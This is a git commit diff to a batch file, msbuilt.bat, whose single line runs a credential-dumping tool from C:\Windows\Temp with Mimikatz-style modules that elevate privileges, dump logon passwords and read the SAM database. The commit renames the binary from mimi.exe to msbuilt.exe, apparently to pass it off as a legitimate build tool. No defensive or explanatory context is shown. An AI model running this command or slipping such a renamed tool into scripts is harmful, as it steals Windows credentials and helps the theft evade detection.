201892b9450a2bda49a11649a4a254d10198e9b3
AHLASaad <93229038+AHLASaad@users.noreply.github.com>
2022-05-23 13:39:47 +0100

    Update msbuilt.bat

--- msbuilt.bat
+++ msbuilt.bat
@@ -1,1 +1,1 @@
-C:\Windows\Temp\mimi.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonPasswords' 'lsadump::sam' 'exit'
+C:\Windows\Temp\msbuilt.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonPasswords' 'lsadump::sam' 'exit'
